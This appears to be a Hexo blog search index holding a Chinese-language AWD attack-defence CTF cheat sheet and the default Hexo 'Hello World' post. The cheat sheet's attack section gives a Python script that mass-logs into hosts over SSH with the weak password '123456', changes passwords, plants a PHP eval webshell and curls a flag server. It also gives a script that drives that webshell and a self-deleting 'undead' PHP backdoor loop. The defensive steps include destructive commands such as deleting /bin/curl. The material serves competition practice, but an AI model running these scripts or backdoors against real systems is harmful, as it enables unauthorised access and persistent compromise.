<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/10/26/AWD%E6%94%BB%E9%98%B2/"/>
      <url>/2023/10/26/AWD%E6%94%BB%E9%98%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="AWD攻防"><a href="#AWD攻防" class="headerlink" title="AWD攻防"></a>AWD攻防</h1><p>基本防守策略</p><p>1、改用户密码和服务密码</p><p>1）改linux用户密码：</p><p>#passwd</p><p>如果有权限就删除用户：</p><p>#userdel -r [用户名]</p><p>2）改mysql密码：</p><p>#update mysql.user set password&#x3D;password(‘密码’) where user&#x3D;’root’;</p><p>删除匿名用户：</p><p>#delete from mysql.user where user&#x3D;’ ‘;</p><p>刷新配置：</p><p>#flush privileges;</p><p>3）改网站后台密码</p><p>从网站页面或者源码或者御剑工具找到后台页面，然后尝试弱口令登入后改管理员密码。</p><p>2、Web防护</p><p>1）将网站目录打包成tar</p><p>#tar -cvf [打包后的文件名.tar] [要打包的文件名]</p><p>2）用ssh或ftp将打包文件拉到本地</p><p>ssh法:</p><p>#scp 用户名@IP地址:要下载的文件路径 存放路径</p><p>如：scp <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#x31;&#x36;&#46;&#56;">&#x72;&#111;&#x6f;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#x31;&#x36;&#46;&#56;</a>:&#x2F;root&#x2F;flag.txt &#x2F;root&#x2F;</p><p>ftp法：</p><p>#ftp [IP地址]</p><p>#get [文件名]</p><p>或者用ftp登入软件下载</p><p>3）将压缩包解压，然后拉到D盾里面扫描木马文件</p><p>4）用ssh控制或ftp控制服务器将木马文件删除</p><p>3、关闭shell连接进程</p><p>1）查看正在连接的进程</p><p>#who</p><p>2）关闭连接进程</p><p>#pkill -kill -t pts&#x2F;进程号</p><p>4、网站守护</p><p>1）查看新增文件，删掉</p><h1 id="find-cmin-30"><a href="#find-cmin-30" class="headerlink" title="find .&#x2F; -cmin -30"></a>find .&#x2F; -cmin -30</h1><p>2）删除不死码</p><h1 id="vim-killshell-sh"><a href="#vim-killshell-sh" class="headerlink" title="vim killshell.sh"></a>vim killshell.sh</h1><h1 id="chmod-777-killshell-sh"><a href="#chmod-777-killshell-sh" class="headerlink" title="chmod 777 killshell.sh"></a>chmod 777 killshell.sh</h1><h1 id="nohup-killshell-sh"><a href="#nohup-killshell-sh" class="headerlink" title="nohup .&#x2F;killshell.sh &amp;"></a>nohup .&#x2F;killshell.sh &amp;</h1><hr><p>#!&#x2F;bin&#x2F;bash</p><p>while true</p><p>do</p><p>rm -rf xxx.php</p><p>done</p><hr><p>3）发现网站页面有漏洞</p><h1 id="echo-xxx-php"><a href="#echo-xxx-php" class="headerlink" title="echo  &gt; xxx.php"></a>echo  &gt; xxx.php</h1><p>PS：平台root用户可能是弱口令toor密码，或者存在内核溢出提权。</p><p>chmod 777 payload</p><p>.&#x2F;payload</p><p>网神杯奇安信平台溢出提权，4.4.0-31-generic Ubuntu 内核。</p><p>rm -rf &#x2F;bin&#x2F;curl</p><p>基本攻击策略</p><p>1、弱口令攻击</p><p>批量用户登入修改密码并写入webshell且获取flag值。</p><p>ls &#x2F;home&#x2F;</p><p>python3 ssh.py</p><hr><p>#!&#x2F;usr&#x2F;bin&#x2F;env python</p><p>#-<em>- coding:utf-8 -</em>-</p><p>import paramiko</p><p>for i in [1,2,3,4,5,6,7,8,9,10]:</p><p>try:</p><p>host &#x3D; “4.4.”+str(i)+”.100”</p><p>s&#x3D;paramiko.SSHClient()</p><p>s.set_missing_host_key_policy(paramiko.AutoAddPolicy())</p><p>s.connect(hostname&#x3D;host,port&#x3D;22,username&#x3D;’user1’,password&#x3D;’123456’)</p><p>stdin,stdout,stderr &#x3D; s.exec_command(‘passwd\n’)</p><p>stdin.write(“123456\<a href="mailto:&#x6e;&#80;&#x61;&#x73;&#115;&#64;&#49;&#50;&#51;&#x2e;&#x63;&#x6f;&#109;">&#x6e;&#80;&#x61;&#x73;&#115;&#64;&#49;&#50;&#51;&#x2e;&#x63;&#x6f;&#109;</a>\<a href="mailto:&#x6e;&#x50;&#97;&#115;&#x73;&#x40;&#x31;&#50;&#51;&#x2e;&#x63;&#x6f;&#x6d;">&#x6e;&#x50;&#97;&#115;&#x73;&#x40;&#x31;&#50;&#51;&#x2e;&#x63;&#x6f;&#x6d;</a>\n”)</p><p>stdin,stdout,stderr &#x3D; s.exec_command(“echo ‘<?php eval($_POST[cmd]);?>‘&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;.zack.php”)</p><p>stdin,stdout,stderr &#x3D; s.exec_command(‘curl <a href="http://192.168.245.250/getkey'">http://192.168.245.250/getkey'</a>)</p><p>print(host+’:’+stdout.read().decode(‘utf-8’))</p><p>s.close()</p><p>except:</p><p>print(host+’:Fails!’)</p><hr><p>2、批量调用webshell获取flag</p><p>用D盾扫描自己的网站木马，根据木马写脚本。</p><p>python3 web.py</p><hr><p>#!&#x2F;usr&#x2F;bin&#x2F;env python</p><p>#-<em>- coding:utf-8 -</em>-</p><p>import requests</p><p>for i in [1,2,3,4,5,6,7,8,9,10]:</p><p>try:</p><p>url&#x3D;”<a href="http://4.4."+str(i)+".100:"+str(1005)+"/.zack.php">http://4.4.&quot;+str(i)+&quot;.100:&quot;+str(1005)+&quot;/.zack.php</a>“</p><p>result&#x3D;requests.post(url,data&#x3D;{‘cmd’:”system(‘curl <a href="http://192.168.245.250/getkey'">http://192.168.245.250/getkey');"},timeout=2</a>;%22%7d,timeout&#x3D;2))</p><p>print(url+’–&gt;’+result.text)</p><p>except:</p><p>print(url+’–&gt;Fails!’)</p><hr><p>3、不死码种植</p><p>将不死码上传网站目录，访问不死码后在当前目录生成.zack.php后门webshell。</p><hr><?phpset_time_limit(0);#1表示忽略与客户端断开连接，继续执行脚本ignore_user_abort(1);#执行完后删除自身unlink(__FILE__);while (1) {$content = '<?php @eval($_POST[zack]);?><p>‘;</p><p>file_put_contents(“.zack.php”, $content);</p><p>usleep(500);  #暂停0.5秒钟</p><p>}</p><p>?&gt;</p><hr><p>杀死不死马的方法，查看不死马的进程ID：</p><h1 id="top-grep-httpd"><a href="#top-grep-httpd" class="headerlink" title="top | grep httpd"></a>top | grep httpd</h1><p>chmod 777 kill.sh</p><p>nohup .&#x2F;kill.sh &amp;</p><p>查到ID为 11198 ，根据ID号和webshell名写.sh脚本。</p><h1 id="vim-kill-sh"><a href="#vim-kill-sh" class="headerlink" title="vim kill.sh"></a>vim kill.sh</h1><hr><p>#!&#x2F;bin&#x2F;bash</p><p>while true</p><p>do</p><p>kill -9 11198</p><p>rm -rf .shell.php</p><p>done</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/10/26/hello-world/"/>
      <url>/2023/10/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
